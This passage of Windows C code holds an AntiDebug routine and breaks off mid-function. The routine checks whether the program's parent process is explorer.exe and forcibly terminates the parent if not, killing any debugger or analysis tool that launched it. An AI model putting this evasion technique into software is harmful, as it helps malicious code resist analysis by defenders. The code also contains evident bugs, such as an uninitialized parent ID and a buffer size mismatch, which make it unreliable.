
```c
char *szTemp=strrchr(szSource,'\\');
if(szTemp!=NULL)
{
    szTemp++;
    DWORD l=DWORD(strlen(szTemp))+1;
    CopyMemory(szSource,szTemp,l);
}

void AntiDebug()
{
    char lpszSystemInfo[MAX_PATH];
    HANDLE hSnapshot=NULL;
    DWORD PID_child;
    DWORD PID_parent,PID_explorer;
    HANDLE hh_parnet = NULL;
    PROCESSENTRY32    pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);//0x128;
    PID_child=GetCurrentProcessId();//getpid();
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (Process32First(hSnapshot, &pe32))
    {
        while (Process32Next(hSnapshot, &pe32))
        {
            GetFileNameFromPath(pe32.szExeFile);
            CharUpperBuff(pe32.szExeFile,strlen(pe32.szExeFile));
            if(strcmp(pe32.szExeFile,"EXPLORER.EXE")==0)
            {
                PID_explorer=pe32.th32ProcessID;
            }
            if(pe32.th32ProcessID==PID_child)
            {
                PID_parent=pe32.th32ParentProcessID;
            }
        }
    }
    if(PID_parent!=PID_explorer)
    {
        hh_parnet= OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID_parent);
        TerminateProcess(hh_parnet, 0);
    }
    else
    {
        MODULEENTRY32    me32 = {0};
        me32.dwSize = sizeof(MODULEENTRY32);
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID_explorer);
        if (Module32First(hSnapshot, &me32))
        {
            do
            {
                if(PID_explorer==me32.th32ProcessID)
                {
                    GetWindowsDirectory(lpszSystemInfo, MAX_PATH+1);
                    strcat(lpszSystemInfo,"\\");
                    strcat(lpszSystemInfo,"EXPLORER.EXE");
                    CharUpperBuff(me32.szExePath, strlen(me32.szExePath));
                    if(strncmp(me32.szExePath, lpszSystemInfo, strlen(lpszSystemInfo)))
                    {
```
